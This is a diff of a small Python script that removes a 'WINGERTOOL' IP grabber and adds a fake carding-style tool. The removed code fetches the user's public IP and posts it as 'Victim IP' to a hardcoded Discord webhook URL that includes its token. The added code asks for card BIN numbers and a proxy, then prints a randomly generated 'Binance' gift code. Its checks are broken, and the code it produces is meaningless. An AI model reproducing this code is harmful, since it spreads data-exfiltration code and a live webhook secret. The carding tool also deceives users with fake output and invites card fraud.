@@ -1,47 +1,35 @@
-# Author: wingsscripts
-# Version: 1.0.2
+import time
+import random
 
-import requests
-import socket
-
-print("WINGERTOOL")
-print("")
-
-print("Loading")
-
-
-# Grabbing IP
-import requests
-
-def get_public_ip():
-    try:
-        response = requests.get("https://api.ipify.org", timeout=5)
-        return response.text
-    except requests.RequestException:
-        return "Nie udało się pobrać publicznego "
-
-
-
-# WEBHOOK
-webhook_url = "https://discord.com/api/webhooks/1393916680530427915/gDUBIpEYftGEIRdo0K0dwD4LHW0pnVdqOUPlcgR8v37R2vW7QSs1CLu7JSSRq7Hv1Luz"  # ← wklej tu swój link
-dane = get_public_ip()
-
-print("Loaded successfully✅")
-
-print("Choose a virus")
-print("[1] IP Grabber")
-chooseOption = int(input(""))
-
-if chooseOption == 1:
-    get_public_ip()
+def generate_code():
+    part1 = str(random.randint(0, 9999)).zfill(4)
+    part2 = str(random.randint(0, 99999)).zfill(5)
+    part3 = str(random.randint(0, 9999)).zfill(4)
+    return f"{part1}-{part2}-{part3}"
     
-    payload = {
-        "content": f"Victim IP: `{dane}`"
-    }
+i = int(input("Enter card bin: "))
 
-response = requests.post(webhook_url, json=payload)
-
-if response.status_code == 204:
-    print("✅ Hacked")
+if i in ['4645', '4649', '4613']:
+    print()
 else:
-    print(f"❌ Error: {response.status_code}")
+    print('Invalid bin')
+    exit()
+
+try:
+    b = int(input("Enter rest of the numbers"))
+except:
+    print("Failed")
+    exit()
+
+p = input("Enter proxy")
+if p == "" or " ":
+    print("Running on LOCAL proxy")
+else:
+    print(f"Using proxy: {p}")
+
+print("Performing operations")    
+time.sleep(15)
+
+code = generate_code()
+print("CODE GENERATED 50$ BINANCE " + code)
+
